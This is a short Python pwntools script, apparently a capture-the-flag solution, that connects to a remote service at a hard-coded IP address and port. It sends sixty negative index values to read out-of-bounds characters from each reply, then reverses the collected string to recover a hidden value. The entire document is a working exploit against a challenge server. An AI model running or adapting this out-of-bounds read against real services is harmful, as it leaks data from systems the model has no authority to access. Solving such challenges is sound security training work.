from pwn import *
import re

io = remote('23.146.248.230', 12343)
out = b''

io.recvuntil(b': ')
io.sendline(b'asdf')
io.recvuntil(b': ')
for i in range(60):
    io.sendline(str(-i).encode())
    line = io.recvuntil(b': ').decode(errors='ignore')
    try:
        out += re.search(r"'(.*?)'", line).group(1).encode()
    except:
        out += b' '

print(out.decode()[::-1])